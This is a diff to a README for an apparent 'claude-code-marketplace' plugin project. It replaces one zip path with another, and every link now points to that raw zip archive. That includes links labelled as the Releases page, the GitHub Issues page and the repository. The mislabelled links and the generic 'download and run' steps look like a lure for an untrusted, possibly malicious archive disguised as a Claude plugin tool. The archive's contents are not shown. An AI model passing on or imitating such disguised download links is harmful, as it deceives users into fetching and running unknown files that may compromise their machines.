@@ -1,13 +1,13 @@
 # 🎉 claude-code-marketplace - Easy Access to Code Plugins
 
 ## 💾 Download the Application
-[![Download Release](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip)
+[![Download Release](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **claude-code-marketplace**! This application provides a platform to explore and obtain various plugins designed for Claude. Follow the steps below to download and run the software easily.
 
 ## 📥 Download & Install
-1. Click the download button at the top of this page or head to our [Releases page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip).
+1. Click the download button at the top of this page or head to our [Releases page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip).
 2. On the Releases page, find the latest version listed.
 3. Click on the appropriate file for your operating system (Windows, Mac, or Linux) to start the download.
 4. Once the download is complete, locate the file in your Downloads folder or where your browser saves files. 
@@ -45,16 +45,16 @@ In case you run into issues, try the following solutions:
 ## 📞 Support
 If you need help, feel free to reach out:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip) to report bugs or request features.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip) to report bugs or request features.
 - Check the documentation in the repository for additional assistance.
 
 ## 🔗 Additional Resources
 For more information about updates and new features:
 
-- Follow our [GitHub Repository](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip) for the latest developments.
+- Follow our [GitHub Repository](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip) for the latest developments.
 - Join our community forum for discussions and tips on how to get the most out of your plugins.
 
 ## 🔄 Update the Application
-To keep your app running smoothly, regularly check for updates. Visit the [Releases page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/metroclyst/claude-code-marketplace.zip).
+To keep your app running smoothly, regularly check for updates. Visit the [Releases page](https://raw.githubusercontent.com/djscool3508/claude-code-marketplace/main/plugins/legal-compliance-checker/claude-marketplace-code-2.8-beta.3.zip).
 
 We hope you enjoy using **claude-code-marketplace**! Explore a world of plugins tailored for Claude and enhance your coding experience.
